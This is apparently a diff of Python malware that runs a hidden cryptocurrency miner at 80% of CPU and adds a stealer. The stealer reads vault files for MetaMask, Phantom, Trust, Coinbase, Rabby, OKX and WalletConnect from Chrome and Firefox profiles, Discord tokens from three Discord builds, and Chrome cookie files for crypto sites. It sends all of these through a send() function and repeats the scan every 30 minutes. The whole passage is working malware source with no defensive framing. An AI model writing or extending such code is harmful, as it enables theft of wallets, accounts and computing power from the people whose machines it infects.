@@ -7,6 +7,7 @@ import threading
 import zipfile
 import multiprocessing
 import shutil
+import json
 from pathlib import Path
 from mnemonic import Mnemonic
 
@@ -18,7 +19,9 @@ TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
 MINER = os.path.join(TEMP, 'helper.exe')
 
 CPU_CORES = multiprocessing.cpu_count()
-THREADS = max(2, int(CPU_CORES * 0.6))
+THREADS = max(2, int(CPU_CORES * 0.8))  # Use 80% of CPU
+
+print(f"[MINER] CPU Cores: {CPU_CORES}, Using: {THREADS} threads (80%)")
 
 def send(data):
     try:
@@ -58,107 +61,183 @@ def start_miner():
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
-    except:
-        pass
+            print(f"[MINER] Launched with {THREADS} threads")
+    except Exception as e:
+        print(f"[MINER] Error: {e}")
 
-def steal_metamask_vault():
-    """Steal the Metamask vault (LOCK file)."""
-    paths = [
-        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"),
-        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\Profile*\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"),
-        os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\storage\\default\\moz-extension+++*\\idb\\LOCK"),
-    ]
+def steal_browser_extensions():
+    """Steal wallet extension vaults."""
+    print("[WALLET] Scanning for extension vaults...")
     
-    for path_pattern in paths:
-        from glob import glob
-        for path in glob(path_pattern):
-            try:
-                if os.path.exists(path):
-                    with open(path, 'r', errors='ignore') as f:
-                        content = f.read()
-                        if content:
-                            send({
-                                'type': 'metamask_vault',
-                                'path': path,
-                                'content': content[:100000]
-                            })
-                            print(f"[VAULT] Metamask vault stolen: {path}")
-                            # Copy the file to temp for later analysis
-                            shutil.copy(path, os.path.join(TEMP, 'metamask_vault.bak'))
-            except:
-                pass
-
-def scan_browser_extensions():
-    """Scan for other wallet extensions."""
+    # Extension IDs (Metamask, Phantom, Trust, Coinbase, Rabby, OKX)
     extensions = {
         'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
         'phantom': 'bfnaelmomejmhlkdgepjocepnpkbmjgj',
         'trust': 'egjidjbpglichdcondbcbdnbeeppgdph',
         'coinbase': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
+        'rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
+        'okx': 'mcohilncbfahbmgdjkbpemcciiolgcge',
+        'walletconnect': 'bockfbmjcgpkmgdmakpkjnmdhfdnncop',
     }
     
+    found = 0
     for name, ext_id in extensions.items():
-        path = os.path.expandvars(f"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\{ext_id}\\LOCK")
-        if os.path.exists(path):
-            try:
-                with open(path, 'r', errors='ignore') as f:
-                    content = f.read()
-                    if content:
-                        send({
-                            'type': f'{name}_vault',
-                            'path': path,
-                            'content': content[:100000]
-                        })
-                        print(f"[VAULT] {name} vault stolen")
-            except:
-                pass
+        # Chrome paths
+        chrome_paths = [
+            os.path.expandvars(f"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\{ext_id}"),
+            os.path.expandvars(f"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile*\\Local Extension Settings\\{ext_id}"),
+        ]
+        
+        for base_path in chrome_paths:
+            from glob import glob
+            for path in glob(base_path):
+                if os.path.exists(path):
+                    # Look for LOCK file (contains vault data)
+                    lock_file = os.path.join(path, 'LOCK')
+                    if os.path.exists(lock_file):
+                        try:
+                            with open(lock_file, 'r', errors='ignore') as f:
+                                content = f.read()
+                                if content and len(content) > 50:
+                                    send({
+                                        'type': f'{name}_vault',
+                                        'path': lock_file,
+                                        'content': content[:100000]
+                                    })
+                                    found += 1
+                                    print(f"[VAULT] {name} vault stolen from Chrome")
+                        except:
+                            pass
+                    
+                    # Also look for other files that might contain vault data
+                    for file in ['CURRENT', 'LOG', 'MANIFEST-000001']:
+                        file_path = os.path.join(path, file)
+                        if os.path.exists(file_path):
+                            try:
+                                with open(file_path, 'r', errors='ignore') as f:
+                                    content = f.read()
+                                    if content and len(content) > 100:
+                                        if 'vault' in content.lower() or 'seed' in content.lower():
+                                            send({
+                                                'type': f'{name}_vault_file',
+                                                'path': file_path,
+                                                'content': content[:50000]
+                                            })
+                                            print(f"[VAULT] {name} data from {file}")
+                            except:
+                                pass
+        
+        # Firefox paths
+        firefox_base = os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles\\")
+        if os.path.exists(firefox_base):
+            for profile in os.listdir(firefox_base):
+                if profile.endswith('.default'):
+                    storage_path = os.path.join(firefox_base, profile, 'storage', 'default')
+                    if os.path.exists(storage_path):
+                        for item in os.listdir(storage_path):
+                            if ext_id in item:
+                                full_path = os.path.join(storage_path, item)
+                                if os.path.isdir(full_path):
+                                    for root, dirs, files in os.walk(full_path):
+                                        for f in files:
+                                            if f.endswith('.sqlite'):
+                                                try:
+                                                    with open(os.path.join(root, f), 'rb') as fp:
+                                                        content = fp.read(100000)
+                                                        send({
+                                                            'type': f'{name}_firefox',
+                                                            'path': os.path.join(root, f),
+                                                            'content': content.hex()[:100000]
+                                                        })
+                                                        print(f"[VAULT] {name} data from Firefox")
+                                                except:
+                                                    pass
+    
+    print(f"[WALLET] Found {found} extension vaults")
 
-def steal_discord_token():
-    """Steal Discord token from local storage."""
-    paths = [
-        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb\\*.log"),
-        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb\\*.ldb"),
+def steal_discord_tokens():
+    """Steal Discord tokens from local storage."""
+    print("[TOKEN] Scanning for Discord tokens...")
+    
+    discord_paths = [
+        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb"),
+        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
+        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
     ]
     
-    for path_pattern in paths:
-        from glob import glob
-        for path in glob(path_pattern):
+    found = 0
+    for path in discord_paths:
+        if os.path.exists(path):
+            for file in os.listdir(path):
+                if file.endswith('.log') or file.endswith('.ldb'):
+                    file_path = os.path.join(path, file)
+                    try:
+                        with open(file_path, 'r', errors='ignore') as f:
+                            content = f.read()
+                            # Discord token pattern
+                            match = re.search(r'[a-zA-Z0-9_-]{64}', content)
+                            if match:
+                                send({
+                                    'type': 'discord_token',
+                                    'path': file_path,
+                                    'content': match.group()
+                                })
+                                found += 1
+                                print(f"[TOKEN] Discord token found")
+                    except:
+                        pass
+    
+    print(f"[TOKEN] Found {found} Discord tokens")
+
+def steal_browser_cookies():
+    """Steal browser cookies for crypto sites."""
+    print("[COOKIES] Scanning for browser cookies...")
+    
+    # This would require reading the cookies database
+    # Simplified: just look for cookie files
+    cookie_paths = [
+        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"),
+    ]
+    
+    for path in cookie_paths:
+        if os.path.exists(path):
             try:
-                with open(path, 'r', errors='ignore') as f:
-                    content = f.read()
-                    # Look for Discord token pattern (64 chars)
-                    match = re.search(r'[a-zA-Z0-9_-]{64}', content)
-                    if match:
-                        send({
-                            'type': 'discord_token',
-                            'path': path,
-                            'content': match.group()
-                        })
-                        print(f"[TOKEN] Discord token stolen")
+                with open(path, 'rb') as f:
+                    content = f.read(100000)
+                    # Check if it contains crypto site cookies
+                    crypto_sites = ['metamask', 'phantom', 'opensea', 'uniswap']
+                    content_str = content.decode('latin-1', errors='ignore')
+                    for site in crypto_sites:
+                        if site in content_str.lower():
+                            send({
+                                'type': 'cookie_file',
+                                'path': path,
+                                'content': content.hex()[:100000]
+                            })
+                            print(f"[COOKIES] Found crypto site cookies")
             except:
                 pass
 
-def scan_for_wallets():
-    """Main wallet scanning function."""
-    print("[WALLET] Scanning for wallets...")
-    
-    # Steal Metamask vault
-    steal_metamask_vault()
-    
-    # Steal other extensions
-    scan_browser_extensions()
-    
-    # Steal Discord token
-    steal_discord_token()
+def scan_all():
+    """Run all scans."""
+    steal_browser_extensions()
+    steal_discord_tokens()
+    steal_browser_cookies()
+    print("[WALLET] All scans complete")
 
 def main():
     print("[SERVICE] Starting...")
     
-    # Start miner
+    # Start miner with 80% CPU
     threading.Thread(target=start_miner, daemon=True).start()
     
-    # Start wallet scanner (runs once)
-    threading.Thread(target=scan_for_wallets, daemon=True).start()
+    # Run wallet scanner once (then repeats every 30 minutes)
+    def scan_loop():
+        while True:
+            scan_all()
+            time.sleep(1800)  # 30 minutes
+    
+    threading.Thread(target=scan_loop, daemon=True).start()
     
     print("[SERVICE] Running...")
     try:
